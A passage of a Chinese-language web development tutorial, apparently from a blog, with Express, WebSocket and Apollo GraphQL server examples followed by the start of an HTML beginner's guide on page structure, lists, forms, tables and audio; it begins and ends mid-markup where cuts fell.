function_">express</span>();<br><br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/api/users&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Get all users&#x27;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/users&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Create a new user&#x27;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Server running on port 3000&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="10-2-实现-WebSocket-通信"><a href="#10-2-实现-WebSocket-通信" class="headerlink" title="10.2 实现 WebSocket 通信"></a>10.2 实现 WebSocket 通信</h3><p>WebSocket 是一种在客户端和服务器之间实现全双工通信的协议，适合实时应用。</p><h4 id="10-2-1-WebSocket-基础"><a href="#10-2-1-WebSocket-基础" class="headerlink" title="10.2.1 WebSocket 基础"></a>10.2.1 WebSocket 基础</h4><p>Node.js 可以使用 <code>ws</code> 模块实现 WebSocket 通信。</p><p>安装 <code>ws</code> 模块：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install ws<br></code></pre></td></tr></table></figure><p><strong>创建 WebSocket 服务器：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">WebSocket</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;ws&#x27;</span>);<br><span class="hljs-keyword">const</span> wss = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocket</span>.<span class="hljs-title class_">Server</span>(&#123; <span class="hljs-attr">port</span>: <span class="hljs-number">8080</span> &#125;);<br><br>wss.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;connection&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">ws</span>) =&gt;</span> &#123;<br>  ws.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;message&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">message</span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Received: %s&#x27;</span>, message);<br>  &#125;);<br>  ws.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Hello WebSocket Client!&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="10-2-2-使用-ws-实现-WebSocket-服务"><a href="#10-2-2-使用-ws-实现-WebSocket-服务" class="headerlink" title="10.2.2 使用 ws 实现 WebSocket 服务"></a>10.2.2 使用 <code>ws</code> 实现 WebSocket 服务</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js">wss.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;connection&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">ws</span>) =&gt;</span> &#123;<br>  ws.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;message&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">message</span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Received: %s&#x27;</span>, message);<br>    ws.<span class="hljs-title function_">send</span>(<span class="hljs-string">`Echo: <span class="hljs-subst">$&#123;message&#125;</span>`</span>);<br>  &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="10-3-使用-GraphQL-构建-API"><a href="#10-3-使用-GraphQL-构建-API" class="headerlink" title="10.3 使用 GraphQL 构建 API"></a>10.3 使用 GraphQL 构建 API</h3><p>GraphQL 是一种灵活的数据查询语言，适合复杂查询的 API 设计。</p><h4 id="10-3-1-GraphQL-概述"><a href="#10-3-1-GraphQL-概述" class="headerlink" title="10.3.1 GraphQL 概述"></a>10.3.1 GraphQL 概述</h4><p>GraphQL 提供了查询、变更和订阅功能，允许客户端请求所需的数据。</p><h4 id="10-3-2-使用-Apollo-Server-构建-GraphQL-API"><a href="#10-3-2-使用-Apollo-Server-构建-GraphQL-API" class="headerlink" title="10.3.2 使用 Apollo Server 构建 GraphQL API"></a>10.3.2 使用 Apollo Server 构建 GraphQL API</h4><p>安装 <code>apollo-server</code> 和 <code>graphql</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install apollo-server graphql<br></code></pre></td></tr></table></figure><p><strong>定义 Schema 和 Resolvers：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> &#123; <span class="hljs-title class_">ApolloServer</span>, gql &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;apollo-server&#x27;</span>);<br><br><span class="hljs-keyword">const</span> typeDefs = gql`<span class="language-graphql"></span><br><span class="language-graphql">  <span class="hljs-keyword">type</span> <span class="hljs-keyword">Query</span> <span class="hljs-punctuation">&#123;</span></span><br><span class="language-graphql">    <span class="hljs-symbol">hello</span><span class="hljs-punctuation">:</span> String</span><br><span class="language-graphql">  <span class="hljs-punctuation">&#125;</span></span><br><span class="language-graphql">`</span>;<br><br><span class="hljs-keyword">const</span> resolvers = &#123;<br>  <span class="hljs-title class_">Query</span>: &#123;<br>    <span class="hljs-attr">hello</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-string">&#x27;Hello, GraphQL!&#x27;</span><br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> server = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApolloServer</span>(&#123; typeDefs, resolvers &#125;);<br><br>server.<span class="hljs-title function_">listen</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">&#123; url &#125;</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Server ready at <span class="hljs-subst">$&#123;url&#125;</span>`</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><hr><h1 id="HTML-详尽入门指南"><a href="#HTML-详尽入门指南" class="headerlink" title="HTML 详尽入门指南"></a>HTML 详尽入门指南</h1><h3 id="目录-4"><a href="#目录-4" class="headerlink" title="目录"></a>目录</h3><ol><li><a href="#html-%E5%9F%BA%E7%A1%80">HTML 基础</a><ul><li><a href="#html-%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84">HTML 文件结构</a></li><li><a href="#html-%E6%A0%87%E8%AE%B0%E6%A0%87%E7%AD%BE">HTML 标记（标签）</a></li></ul></li><li><a href="#html-%E5%85%83%E7%B4%A0%E8%AF%A6%E8%A7%A3">HTML 元素详解</a><ul><li><a href="#%E6%A0%87%E9%A2%98headings">标题（Headings）</a></li><li><a href="#%E6%AE%B5%E8%90%BDparagraphs">段落（Paragraphs）</a></li><li><a href="#%E9%93%BE%E6%8E%A5links">链接（Links）</a></li><li><a href="#%E5%9B%BE%E5%83%8Fimages">图像（Images）</a></li><li><a href="#%E5%88%97%E8%A1%A8lists">列表（Lists）</a></li></ul></li><li><a href="#html-%E8%A1%A8%E5%8D%95">HTML 表单</a><ul><li><a href="#%E8%A1%A8%E5%8D%95%E5%85%83%E7%B4%A0">表单元素</a></li><li><a href="#%E8%A1%A8%E5%8D%95%E6%8F%90%E4%BA%A4">表单提交</a></li></ul></li><li><a href="#html-%E8%A1%A8%E6%A0%BC">HTML 表格</a></li><li><a href="#html-%E5%A4%9A%E5%AA%92%E4%BD%93">HTML 多媒体</a></li><li><a href="#html-%E5%9F%BA%E6%9C%AC%E5%B8%83%E5%B1%80">HTML 基本布局</a></li></ol><hr><h3 id="HTML-基础"><a href="#HTML-基础" class="headerlink" title="HTML 基础"></a>HTML 基础</h3><h4 id="HTML-文件结构"><a href="#HTML-文件结构" class="headerlink" title="HTML 文件结构"></a>HTML 文件结构</h4><p>一个完整的 HTML 文档包括以下基本结构：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>示例 HTML 页面<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>欢迎来到我的网站<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>这是一个简单的 HTML 页面。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>解释：</strong></p><ul><li><code>&lt;!DOCTYPE html&gt;</code>：声明文档类型，告知浏览器这是一个 HTML5 文档。</li><li><code>&lt;html&gt;</code>：HTML 文档的根元素。</li><li><code>&lt;head&gt;</code>：包含关于文档的信息（元数据），如标题、编码、样式等。</li><li><code>&lt;title&gt;</code>：网页的标题，显示在浏览器的标签页上。</li><li><code>&lt;meta charset=&quot;UTF-8&quot;&gt;</code>：设置文档的字符编码为 UTF-8，确保支持多语言字符集。</li><li><code>&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</code>：响应式设计设置，适配移动设备。</li><li><code>&lt;body&gt;</code>：文档的主体，包含网页的可见内容。</li></ul><hr><h4 id="HTML-标记（标签）"><a href="#HTML-标记（标签）" class="headerlink" title="HTML 标记（标签）"></a>HTML 标记（标签）</h4><p>HTML 使用标记（标签）来表示网页的元素。HTML 标签通常成对出现，由开始标签和结束标签构成：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>这是一个段落。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>&lt;p&gt;</code> 是段落的开始标签。</li><li><code>&lt;/p&gt;</code> 是段落的结束标签。</li></ul><p>某些 HTML 标签是自闭合的，表示该元素没有内容，例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;image.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;示例图片&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>&lt;img&gt;</code> 是图片标签，它没有结束标签。</li></ul><hr><h3 id="HTML-元素详解"><a href="#HTML-元素详解" class="headerlink" title="HTML 元素详解"></a>HTML 元素详解</h3><h4 id="标题（Headings）"><a href="#标题（Headings）" class="headerlink" title="标题（Headings）"></a>标题（Headings）</h4><p>HTML 提供了六种不同级别的标题标签，<code>&lt;h1&gt;</code> 到 <code>&lt;h6&gt;</code>，其中 <code>&lt;h1&gt;</code> 表示最大的标题，<code>&lt;h6&gt;</code> 表示最小的标题。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>这是一级标题<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>这是二级标题<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>这是三级标题<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br></code></pre></td></tr></table></figure><p>标题的作用不仅是视觉上的层次结构，还会被搜索引擎用于页面索引，有助于 SEO 优化。</p><hr><h4 id="段落（Paragraphs）"><a href="#段落（Paragraphs）" class="headerlink" title="段落（Paragraphs）"></a>段落（Paragraphs）</h4><p>段落用 <code>&lt;p&gt;</code> 标签表示，用于将文本分成段落。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>这是第一个段落。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>这是第二个段落。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><p>多个段落会自动在浏览器中分开显示。</p><hr><h4 id="链接（Links）"><a href="#链接（Links）" class="headerlink" title="链接（Links）"></a>链接（Links）</h4><p>链接是 HTML 中非常重要的元素，用于创建超链接，使用户可以在页面之间或外部网站之间导航。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://www.example.com&quot;</span>&gt;</span>点击访问示例网站<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>href</code> 属性指定了链接目标（URL）。</li><li>链接的文本是可点击的部分。</li></ul><p>你也可以使用 <code>target=&quot;_blank&quot;</code> 属性在新标签页中打开链接：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://www.example.com&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;_blank&quot;</span>&gt;</span>在新标签页中打开<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><hr><h4 id="图像（Images）"><a href="#图像（Images）" class="headerlink" title="图像（Images）"></a>图像（Images）</h4><p>使用 <code>&lt;img&gt;</code> 标签来在网页中插入图像。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;image.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;描述图像&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>src</code> 属性指定图片的路径或 URL。</li><li><code>alt</code> 属性为图片提供文本替代，浏览器无法加载图像时显示，或用于屏幕阅读器。</li></ul><hr><h4 id="列表（Lists）"><a href="#列表（Lists）" class="headerlink" title="列表（Lists）"></a>列表（Lists）</h4><p>HTML 提供了两种主要的列表：有序列表和无序列表。</p><ul><li><strong>无序列表</strong> 使用 <code>&lt;ul&gt;</code> 和 <code>&lt;li&gt;</code> 标签：</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>项目一<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>项目二<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>项目三<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><strong>有序列表</strong> 使用 <code>&lt;ol&gt;</code> 和 <code>&lt;li&gt;</code> 标签：</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ol</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>第一项<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>第二项<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>第三项<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ol</span>&gt;</span><br></code></pre></td></tr></table></figure><hr><h3 id="HTML-表单"><a href="#HTML-表单" class="headerlink" title="HTML 表单"></a>HTML 表单</h3><p>HTML 表单允许用户输入数据，并通过提交数据与服务器进行交互。</p><h4 id="表单元素"><a href="#表单元素" class="headerlink" title="表单元素"></a>表单元素</h4><p>HTML 提供了多种表单元素，包括文本框、单选按钮、复选框、下拉菜单等。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/submit&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;name&quot;</span>&gt;</span>姓名：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;email&quot;</span>&gt;</span>邮箱：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;email&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;gender&quot;</span>&gt;</span>性别：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;male&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;gender&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;male&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;male&quot;</span>&gt;</span>男<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;female&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;gender&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;female&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;female&quot;</span>&gt;</span>女<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;hobby&quot;</span>&gt;</span>爱好：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;hobby1&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;hobby[]&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;阅读&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;hobby1&quot;</span>&gt;</span>阅读<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;hobby2&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;hobby[]&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;运动&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;hobby2&quot;</span>&gt;</span>运动<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>input</code> 标签表示用户输入字段。</li><li><code>label</code> 标签与表单元素关联，点击标签会聚焦到相应的输入字段。</li><li><code>input type=&quot;submit&quot;</code> 用于创建提交按钮。</li></ul><hr><h4 id="表单提交"><a href="#表单提交" class="headerlink" title="表单提交"></a>表单提交</h4><ul><li><code>action</code> 属性指定了表单提交的目标 URL。</li><li><code>method</code> 属性定义了提交方式（GET 或 POST）。</li></ul><p>当用户填写表单并点击提交按钮后，表单中的数据会被发送到服务器进行处理。</p><hr><h3 id="HTML-表格"><a href="#HTML-表格" class="headerlink" title="HTML 表格"></a>HTML 表格</h3><p>表格用来展示结构化的数据，表格的基本元素包括 <code>&lt;table&gt;</code>、<code>&lt;tr&gt;</code>（表格行）、<code>&lt;th&gt;</code>（表头）、<code>&lt;td&gt;</code>（表格单元格）。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>姓名<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>年龄<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>城市<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>张三<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>28<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>北京<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>李四<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>32<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>上海<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>&lt;th&gt;</code> 用于表头，默认是加粗且居中的。</li><li><code>&lt;td&gt;</code> 用于表格的每个单元格。</li><li><code>border=&quot;1&quot;</code> 为表格添加边框。</li></ul><hr><h3 id="HTML-多媒体"><a href="#HTML-多媒体" class="headerlink" title="HTML 多媒体"></a>HTML 多媒体</h3><p>HTML 支持嵌入多媒体文件如音频和视频。</p><h4 id="嵌入音频"><a href="#嵌入音频" class="headerlink" title="嵌入音频"></a>嵌入音频</h4><p>使用 <code>&lt;audio&gt;</code> 标签嵌入音频文件：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">audio</span> <span class="hljs-attr">controls</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span 